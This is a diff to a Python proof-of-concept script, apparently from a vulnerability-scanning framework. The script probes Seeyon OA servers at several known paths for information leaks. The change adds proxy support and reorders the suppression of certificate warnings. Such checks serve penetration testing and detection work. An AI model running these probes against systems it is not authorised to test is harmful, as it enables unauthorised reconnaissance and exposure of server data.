@@ -2,9 +2,11 @@
 # _*_ coding:utf-8 _*_
 
 import requests
-from Config.config_requests import ua, headers
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
 
+from Config.config_proxies import proxies
+from Config.config_requests import headers
+
+requests.packages.urllib3.disable_warnings()
 # 脚本信息
 ######################################################
 NAME='Seeyon_OA_Info_Leak'
@@ -21,12 +23,12 @@ def poc(target):
     vuln_url4 = target + "/yyoa/assess/js/initDataAssess.jsp"
     vuln_url5 = target + "/seeyon/management/status.jsp"
     try:
-        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
-        r1 = requests.get(url=vuln_url1, headers=headers, verify=False, timeout=5)
-        r2 = requests.get(url=vuln_url2, headers=headers, verify=False, timeout=5)
-        r3 = requests.get(url=vuln_url3, headers=headers, verify=False, timeout=5)
-        r4 = requests.get(url=vuln_url4, headers=headers, verify=False, timeout=5)       
-        r5 = requests.get(url=vuln_url5, headers=headers, verify=False, timeout=5)
+
+        r1 = requests.get(url=vuln_url1, headers=headers, verify=False, timeout=5,proxies=proxies)
+        r2 = requests.get(url=vuln_url2, headers=headers, verify=False, timeout=5,proxies=proxies)
+        r3 = requests.get(url=vuln_url3, headers=headers, verify=False, timeout=5,proxies=proxies)
+        r4 = requests.get(url=vuln_url4, headers=headers, verify=False, timeout=5,proxies=proxies)
+        r5 = requests.get(url=vuln_url5, headers=headers, verify=False, timeout=5,proxies=proxies)
         if 'root' in r1.text and r1.status_code == 200:
             result['信息泄露path1'] = vuln_url1
         else:
